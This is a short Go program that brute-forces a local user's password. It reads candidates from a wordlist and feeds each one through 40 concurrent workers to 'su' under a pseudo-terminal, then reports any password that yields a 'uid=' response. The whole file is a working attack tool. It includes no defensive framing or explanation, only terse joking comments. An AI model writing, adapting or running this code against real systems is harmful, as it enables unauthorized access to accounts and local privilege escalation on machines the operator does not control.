package main

import (
	"bufio"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/creack/pty"
)

func main() {
	log.SetFlags(0)
	if len(os.Args) < 3 {
		log.Fatal("args: username passwordfile")
	}

	username := os.Args[1]
	passwordFile := os.Args[2]
	batchSize := 40

	tasks := make(chan string, batchSize)
	var wg sync.WaitGroup

	for i := 0; i < batchSize; i++ {
		wg.Add(1)
		go func() {
			for candidate := range tasks {
				test(username, candidate)
			}
			wg.Done()
		}()
	}

	processPasswords(passwordFile, tasks)

	close(tasks)
	wg.Wait()
}

func processPasswords(passwordFile string, tasks chan string) {
	file, err := os.Open(passwordFile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		tasks <- scanner.Text()
	}
}

func test(username, candidate string) {
	c := exec.Command("su", "-c", "id", username)
	f, err := pty.Start(c)
	if err != nil {
		time.Sleep(2 * time.Second) // unsucessful attempt to solve issue
		test(username, candidate)   // jokes on me for thinking 'temporarily' means temporarily
		return
	}

	buffer := make([]byte, 10)
	f.Read(buffer) // text 'Password: '
	f.Write([]byte(candidate + "\n"))
	f.Read(buffer)         // new line
	n, _ := f.Read(buffer) // either id text or failure

	if n > 0 && strings.HasPrefix(string(buffer), "uid=") {
		log.Printf("success with %s\n", candidate)
		os.Exit(0)
	} else {
		log.Println(candidate)
	}
}
